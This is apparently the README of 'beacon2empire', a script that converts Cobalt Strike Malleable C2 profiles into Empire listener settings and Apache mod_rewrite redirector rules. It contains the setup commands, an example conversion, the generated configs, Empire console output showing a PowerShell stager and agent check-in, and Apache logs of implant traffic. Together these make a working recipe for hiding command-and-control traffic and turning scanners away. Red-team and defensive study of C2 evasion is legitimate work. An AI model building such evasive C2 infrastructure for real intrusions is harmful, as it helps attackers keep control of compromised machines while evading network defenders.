## beacon2empire

beacon2empire.py can be used to convert Cobalt Strike Malleable C2 profiles to matching Empire listener and Apache mod_rewrite configurations. This serves two important purposes:
- Empire C2 traffic can be made to blend in with regular network traffic.  
- The conditional mod_rewrite configuration ensures that only traffic fitting the parameters of a listener is forwarded to Empire. Everything else gets forwarded elsewhere.  

### Operation
While the proxy can be run on the same server as Empire, it is both tidier and safer to run it externally.

Edit /etc/apache2/apache.conf, changing "AllowOverride None" to "AllowOverride All":
```
<Directory /var/www/>
Options Indexes FollowSymLinks
AllowOverride All
Require all granted
</Directory>
```

Enable the rewrite and proxy modules:
```
sudo a2enmod rewrite proxy proxy_http
sudo service apache2 restart
```

The script requires 4 parameters:
- **-b:** Path containing beacon C2 profiles. Nested folders are OK as the script recurses, searching for files with the extension ".profile".  
- **-e:** Empire URL, the URL that Apache proxies Empire C2 traffic to. This must be of the format:
```
<uri scheme>://<address>:<port> (e.g. http://12.34.56.789:8080)
```    
- **-p:** Proxy URL, the URL that Empire stagers connect to. This must be of the format:
```
<uri scheme>://<address>:<port> (e.g. http://12.34.56.789:8080)
```
- **-r:** Redirect URL, the URL that non-Empire requests are redirected to. This must be of the format:
```
<uri scheme>://<address> (e.g. https://www.google.com)
```

For example:
```
python3 convert.py -e http://12.34.56.789:8080 -p http://23.45.67.890:80 -r https://www.google.com -b /home/ubuntu/c2-profiles
```
- **C2 profile path:** /home/ubuntu/c2-profiles  
- **Empire public address:** 12.34.56.789 (bind address is always 0.0.0.0)  
- **Empire port:** 8080  
- **Proxy IP:** 23.45.67.890  
- **Proxy port:** 80  
- **Redirect URL:** https://www.google.com  

There are two outputs:
- The Empire listener configuration. Use this to start a listener in Empire.  
- The Apache mod_rewrite configuration. Place this in a .htaccess file in the root directory of your Apache server (e.g. /var/www/html).  

When testing, it can pay to tail your Apache access log to ensure that the listener and rewrite configurations line up. You should have 200's for successful hits and 302's for non-Empire traffic. If C2 traffic is hitting the wrong paths, has no user agent or isn't coming through at all - there has likely been an issue with the conversion. Known issues with client parameters are:
- "Connection" header can cause the User Agent not to be sent.  
- "Host" header can cause requests to hit "/" and be redirected instead of proxied.  

### Example
The following example uses a profile from: https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/crimeware/magnitude.profile

The example uses the same parameters as presented above:
```
>python3 convert.py -e http://12.34.56.789:8080 -p http://23.45.67.890:80 -r https://www.google.com -b /home/ubuntu/c2-profiles/test
2020-06-20 16:07:08 blackbox beacon2empire[3508] INFO Converting: /home/ubuntu/c2-profiles/test/magnitude.profile
2020-06-20 16:07:08 blackbox beacon2empire[3508] INFO Empire configuration:
listeners
uselistener http
set Name magnitude
set BindIP 0.0.0.0
set Port 8080
set Host http://23.45.67.890:80
set DefaultJitter 50
set DefaultDelay 45
set DefaultProfile /themes/index.php,/work/1.php|Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)|Accept:image/jpeg, application/*|Referer:http://www.bankofbotswana.bw/|Accept-Encoding:gzip, deflate|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8|Accept-Language:en-US;q=0.5,en;q=0.3|Content-Type:application/octet-stream
set Headers Server:Apache/2.2.17 (Ubuntu)|X-Powered-By:PHP/5.3.5-1ubuntu7.8|Content-Encoding:gzip|Content-Type:text/html
2020-06-20 16:07:08 blackbox beacon2empire[3508] INFO Apache rewrite configuration:
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/(themes/index.php|work/1.php)/?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 8\.0;\ Windows\ NT\ 5\.1;\ Trident/4\.0;\ \.NET\ CLR\ 2\.0\.50727;\ \.NET\ CLR\ 3\.0\.4506\.2152;\ \.NET\ CLR\ 3\.5\.30729\)?$
RewriteRule ^.*$ http://12.34.56.789:8080%{REQUEST_URI} [P]
RewriteRule ^.*$ https://www.google.com/? [L,R=302]
```

Empire console:
```
(Empire: stager/windows/launcher_bat) >
[*] Sending POWERSHELL stager (stage 1) to 23.45.67.890
[*] New agent WXPFM9V2 checked in
[+] Initial agent WXPFM9V2 from 23.45.67.890 now active (Slack)
[*] Sending agent (stage 2) to WXPFM9V2 at 23.45.67.890
```

How staging appears in the Apache log:
```
34.56.78.90 - - [20/Jun/2020:04:14:59 +0000] "GET /work/1.php HTTP/1.1" 200 6003 "http" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
34.56.78.90 - - [20/Jun/2020:04:15:31 +0000] "POST /work/1.php HTTP/1.1" 200 532 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
34.56.78.90 - - [20/Jun/2020:04:15:33 +0000] "POST /work/1.php HTTP/1.1" 200 39216 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
34.56.78.90 - - [20/Jun/2020:04:15:35 +0000] "GET /work/1.php HTTP/1.1" 200 1542 "http" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
```

Whereas a request from a browser is redirected:
```
34.56.78.90 - - [20/Jun/2020:04:24:37 +0000] "GET / HTTP/1.1" 302 535 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"
```

### Credit
Inspiration for this idea came from this blog post: https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/